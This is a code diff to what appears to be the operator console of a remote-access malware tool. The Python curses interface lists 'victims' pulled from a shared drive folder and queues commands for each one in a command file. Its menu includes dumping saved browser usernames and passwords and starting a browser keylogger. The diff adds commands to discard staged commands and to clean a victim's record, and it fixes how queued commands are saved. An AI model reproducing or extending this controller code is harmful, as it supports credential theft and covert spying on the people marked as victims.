@@ -196,7 +196,6 @@ class Home:
     def show(self):# main function
         window.keypad(1)
         self.refresh()
-        self.resize()
 
         while 1:
             key=window.getch()
@@ -411,6 +410,8 @@ class Home:
                 log.error('No previous cached user list found.')
             else:
                 log.warning("showing cached victims name")
+            
+            self.resize()
             return
 
         victims.extend(drive.list_folder(vic_path))# list host drive first
@@ -420,12 +421,13 @@ class Home:
             return
 
         victims.extend(lst)
-        self.resize()
-        log.info("home page restructured.")
+        victims.remove('old')
         
         # func move all file on a folders from source to host
         for i in source_drive.list_folder(vic_path):
             move_file(join(vic_path, i))
+        
+        self.resize()
     
     def secure(self):
         if _d.secure_mod:
@@ -729,7 +731,9 @@ class action:
                 "dump": [self.dump, 'Dump saved user names and password from browsers. [reports: dump_(time).json]'],
                 "stored_value": [self.stored_value, 'check all the key-value stored in data_store. [reports: data_store_(time).json]', ],
                 "set_value": [self.set_value, "change a value of stored key in data_store.", ],
-                "start_logger": [self.start_logger, 'start a browser spacefic key logger.[reports: key_dump.log]', ]
+                "start_logger": [self.start_logger, 'start a browser spacefic key logger.[reports: key_dump.log]', ],
+                "discard": [self.commands.clear, "discard staged commands."],
+                "clean_recoed":[self.clean_record, "remove user name with all listed commands from command file."]
             }
         )
         opt_viewer=Option_view(all_command, opt_win)
@@ -826,6 +830,14 @@ class action:
         self.add_to_listen(f'key_dump_{sec}.log')
         clear()
 
+    def clean_record(self):
+        self.commands.clear()
+        with drive_file(command_file) as f, modify_command:
+            
+            full_com:dict=json.loads(f.read() or "{}")
+            full_com.pop(self.vic_name, None)
+            f.rewrite(full_com)
+
 
     def add_to_listen(self, file_name:str):
         path=join("reports", self.vic_name)
@@ -847,6 +859,7 @@ class action:
         return False
 
     def extend(self, commands):
+        '''extend current self.commands with previous unresposed commands'''
         for i in commands:
             itime=i.pop('time')
             if not self.included(i):
@@ -872,25 +885,26 @@ class action:
             return
 
         with drive_file(command_file) as f, modify_command:
-            pre_com:dict=json.loads(f.read() or "{}")
-            pre_com=pre_com.get(self.vic_name, [])
+            full_com:dict=json.loads(f.read() or "{}")
+            pre_com=full_com.get(self.vic_name, [])
 
             self.extend(pre_com)
-            f.rewrite({
-                self.vic_name:self.commands
-            })
+            full_com[self.vic_name]=self.commands
+
+            f.rewrite(full_com)
 
         last_time[self.vic_name]=self.last_time
-        data_store.set_value('last_time', last_time)
-        self.commands=[]
+        data_store.commit()
+        self.commands.clear()
         return
 
 
 
 if __name__=="__main__":
-    vic = ["".join(random.choices(string.ascii_lowercase, k=20)) for i in range(8)]
+    victims = ["".join(random.choices(string.ascii_lowercase, k=20)) for i in range(8)]
     # action(0)
-    Home().show()
+    home_page = Home()
+    home_page.show()
     # Home().test()
 
     
